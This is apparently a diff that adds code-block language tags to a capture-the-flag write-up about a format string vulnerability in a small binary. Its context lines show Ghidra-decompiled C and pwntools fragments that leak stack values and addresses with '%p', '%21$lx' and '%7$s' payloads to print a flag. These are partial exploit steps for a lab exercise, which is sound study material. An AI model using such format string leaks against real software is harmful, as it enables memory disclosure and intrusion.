@@ -12,7 +12,7 @@ My faucet has a little leak. I really should get it fixed before it causes any d
 I started off by disassembling the file using ghidra disassembler.
 
 ```main``` function:
-```
+```c
 undefined8 main(void)
 
 {
@@ -59,7 +59,7 @@ switchD_001016e8_caseD_0:
 I took a look at main and the other functions, which does not present any possible vulnerability except for the function ```buy item```. It seems like ```buy item``` takes in our input and prints it out using the ```printf``` function. This could mean that it is a format string vulenerability.
 
 ```buy_item``` function:
-```python
+```c
 void buy_item(void)
 
 {
@@ -98,7 +98,7 @@ void buy_item(void)
 I also noticed that the flag file is opened and stored at the location ```0x00104060``` in memory. This could mean that I would need to access the location of where the flag is stored in the memory using the ```printf``` format string vulnerability.
 
 Opening of ```FLAG``` file:
-```
+```c
  __stream = fopen("flag.txt","r");
   if (__stream == (FILE *)0x0) {
     puts("Failed to open the flag file.");
@@ -122,7 +122,7 @@ It seems like all the protections are enabled, and of all of them, Position-Indp
 I proceeded to print the stack values using the format string vulnerability of ```printf```.
 
 Python script:
-```
+```python
 for i in range(26):
     r.sendlineafter(">", b"5")
     r.sendline("AAAABBBB %%%d$p" % i)
@@ -167,7 +167,7 @@ Now, to obtain the memory address of where the ```FLAG``` is stored, I noticed t
 So using the intel gathered, I computed the address of where the ```FLAG``` is stored, and attempted to print out the flag.
 
 Payload:
-```
+```python
 # print out main addr
 r.sendlineafter(">", b"5")
 r.sendline("%21$lx")
@@ -229,7 +229,7 @@ I thought long and hard for a workaround, tried various modifications to my payl
 So now instead of passing ```%6$s``` as input, I pass ```%7$s``` as input, to print the flag.
 
 Final Payload:
-```
+```python
 # print out main addr
 r.sendlineafter(">", b"5")
 r.sendline("%21$lx")
